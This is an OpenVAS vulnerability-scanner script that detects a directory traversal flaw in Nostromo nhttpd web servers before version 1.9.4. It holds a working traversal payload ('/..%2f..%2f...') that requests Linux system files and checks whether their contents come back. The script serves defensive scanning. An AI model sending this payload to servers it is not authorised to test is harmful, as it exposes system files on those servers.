###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_nostromo_nhttpd_web_server_dir_trav_vuln.nasl 13543 2019-02-08 14:43:51Z cfischer $
#
# Nostromo nhttpd Webserver Directory Traversal Vulnerability
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802010");
  script_version("$Revision: 13543 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-08 15:43:51 +0100 (Fri, 08 Feb 2019) $");
  script_tag(name:"creation_date", value:"2011-03-22 08:43:18 +0100 (Tue, 22 Mar 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Nostromo nhttpd Webserver Directory Traversal Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/archive/1/517026/100/0/threaded");
  script_xref(name:"URL", value:"http://www.redteam-pentesting.de/en/advisories/rt-sa-2011-001/-nostromo-nhttpd-directory-traversal-leading-to-arbitrary-command-execution");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80, 8080);
  script_mandatory_keys("nostromo/banner");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to perform directory traversal
  attacks and read arbitrary files on the affected application.");
  script_tag(name:"affected", value:"Nostromo nhttpd Version prior to 1.9.4");
  script_tag(name:"insight", value:"The flaw is due to an error in validating '%2f..' sequences in the
  URI causing attackers to read arbitrary files.");
  script_tag(name:"solution", value:"Upgrade to Nostromo nhttpd to 1.9.4 or later.");
  script_tag(name:"summary", value:"The host is running Nostromo nhttpd web server and is prone to
  directory traversal vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"http://www.nazgul.ch/dev_nostromo.html");
  exit(0);
}

include("host_details.inc");
include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

banner = get_http_banner(port: port);
if("Server: nostromo" >!< banner) {
  exit(0);
}

files = traversal_files("linux");

foreach file(keys(files)) {

  path = "/..%2f..%2f..%2f..%2f..%2f..%2f..%2f/" + files[file];

  if(http_vuln_check(port:port, url:path, pattern:file,
                     check_header:TRUE)) {
    report = report_vuln_url(port:port, url:path);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);